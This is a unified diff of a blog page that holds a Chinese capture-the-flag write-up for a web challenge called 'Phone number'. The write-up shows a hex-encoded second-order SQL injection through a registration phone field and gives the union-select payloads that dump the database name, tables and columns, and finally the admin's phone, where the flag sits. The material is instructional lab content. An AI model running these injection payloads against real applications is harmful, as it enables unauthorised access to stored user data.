@@ -41,7 +41,6 @@ Hello, txt1 Your phone is 1 and 1 = 2 union select database()." />
 
 
 
-<meta name="generator" content="Hugo 0.46" />
 
 
 <link rel="canonical" href="https://madneal.com/post/web%E7%8B%97%E4%B9%8Bwriteup--phone/" />
@@ -227,48 +226,28 @@ Hello, txt1 Your phone is 1 and 1 = 2 union select database()." />
       <h1 class="post-title">web 狗之writeup--phone</h1>
       <p class="post-meta">@Neal · Aug 23, 2018 · 4 min read</p>
     </header>
-    <article class="post-content">
-
-<p><img src="https://i.loli.net/2018/08/23/5b7eb1fbdb1b1.jpeg" alt="WechatIMG7.jpeg" /></p>
-
+    <article class="post-content"><p><img src="https://i.loli.net/2018/08/23/5b7eb1fbdb1b1.jpeg" alt="WechatIMG7.jpeg"></p>
 <p>鄙人不才，只能做个 web 狗了。那就好好学习 web 吧。拼命地刷 writeup 就好了。上题目，<a href="http://106.75.72.168:3333/login.php">Phone number</a>。提示只有 phone number is a good thing.</p>
-
 <p>打开链接可以看到是一个登陆页面，查看源代码，没有什么东西。不过，这个页面还有个注册页面，注册页面有用户名密码以及 phone，查看其源代码也没有什么异常情况。这道题初步看来应该是一道 sql 注入题了，那么注入点在哪呢？当然是 phone 了（来自于上帝视角）。如果正经地来说还是因为题目的提示啦。</p>
-
 <p>注入点的确就是 phone，不过是要使用 16进制字符。为什么呢？上帝告诉我的，我也不知道。好吧，接下来就是 sql 注入四步曲了，爆数据库名，爆表名，爆字段，最后查数据，拿 flag。是不是很开心！</p>
-
 <h2 id="正常用户">正常用户</h2>
-
 <p>首先，我们首先注册一个正常用户，注册之后登录，可以看到页面。这里面有一个 check 的按钮，点击一下，可以看到页面提示 There only 369 people use the same phone as you。查看源代码，可以看到注释里面有一句话：听说admin的电话藏着大秘密哦，这也是一个小提示。这里面的369应该就是通过 sql 语句从数据库拿到的，语句可能就是类似于 <code>select count(*) from user where phonenum = 12</code> 这种的，从而查出和你电话号码一样的用户数了，那么我可以信誓旦旦地告诉你，这就是一个注入点啦！</p>
-
 <h2 id="数据库名">数据库名</h2>
-
 <p>因为 phone 可能使用的是数字，所以这是一个数字型的注入。那么，我买可以随便注册一个用户名了，首先获取数据库名的语句是 <code>1 and 1 = 2 union select database()</code>，把这个语句转化为16进制字符。将这个16进制字符串作为 phone 来进行注册，这里注意的一个点就是，前台对于 phone 的长度做了限制， <code>maxlength=&quot;11&quot;</code>，打开开发者工具设置大一点就可以了。注册成功之后，我么就可以看到：</p>
-
 <p>Hello, txt1
 Your phone is 1 and 1 = 2 union select database().
 Click on the link and you&rsquo;ll know how many people use the same phone as you.</p>
-
 <p>那么我们可以继续点击 check 按钮，页面显示</p>
-
 <p>There only 0 people use the same phone as you
 There only webdb people use the same phone as you</p>
-
 <p>这里的 webdb 很显然就是数据库名了。</p>
-
 <h2 id="表名">表名</h2>
-
 <p>接下来就是表名，这里比较麻烦的就是注入一次，就要注册一次，而且用户名不可以重复。算了，继续吧。构造查表名的语句：<code>1 union select table_name from information_schema.tables where table_schema = database()</code>,转化为16进制字符继续注册。再继续登录，点击 check:</p>
-
 <p>There only 29891 people use the same phone as you
 There only user people use the same phone as you</p>
-
 <p>现在可以看出表名就是 user 了。</p>
-
 <h2 id="字段名">字段名</h2>
-
 <p>同样的配方，还是同样的味道。查询语句：<code>1 union select column_name from information_schema.columns where table_name=&quot;user&quot;</code>，点击 check，就会显示出列名：</p>
-
 <p>There only 29893 people use the same phone as you
 There only Host people use the same phone as you
 There only User people use the same phone as you
@@ -315,13 +294,9 @@ There only authentication_string people use the same phone as you
 There only id people use the same phone as you
 There only username people use the same phone as you
 There only phone people use the same phone as you</p>
-
 <p>可以看到已经出现很多列名了，我们可以看到一些比较关键的列名，比如 username 以及 phone。</p>
-
 <h2 id="flag">Flag</h2>
-
 <p>哈哈，最后一步了！Flag，马上就可以得到啦！由于之前的提示，我们可以知道 admin 的 phone 很重要，那么我们的语句就应该是，必须是：<code>1 union select phone from webdb.user where username = &quot;admin&quot;</code>，点击 check，显示：</p>
-
 <p>There only 29894 people use the same phone as you
 There only flag{6dd303b0-8fce-2396-9ad8-d9f7a72f84b0} people use the same phone as you
 There only 1555555 people use the same phone as you
@@ -332,7 +307,6 @@ There only 111111111111111 people use the same phone as you
 There only 11111111111 people use the same phone as you
 There only 12345678912 people use the same phone as you
 There only 111111 people use the same phone as you</p>
-
 <p>哈哈，常规套路，这个 wp 除了浏览器没有使用任何第三方工具即可完成，是不是很方便。不过我的 writeup 也是站在巨人的肩膀上完成的。</p>
 </article>
     <footer class="post-footer">
@@ -348,13 +322,13 @@ There only 111111 people use the same phone as you</p>
       </ul>
       
       <p class="post-copyright">
-        © This post is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License，please give source if you wish to quote or reproduce.This post was published <strong>1357</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
+        © This post is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License，please give source if you wish to quote or reproduce.This post was published <strong>1370</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
       </p>
     </footer>
     
       <div id="disqus_thread"></div>
-<script>
-    var disqus_config = function () {
+<script type="application/javascript">
+    window.disqus_config = function () {
     
     
     
@@ -408,7 +382,7 @@ There only 111111 people use the same phone as you</p>
 <script src="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/js/bundle.js"></script>
 
 
-<script>
+<script type="application/javascript">
 var doNotTrack = false;
 if (!doNotTrack) {
 	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
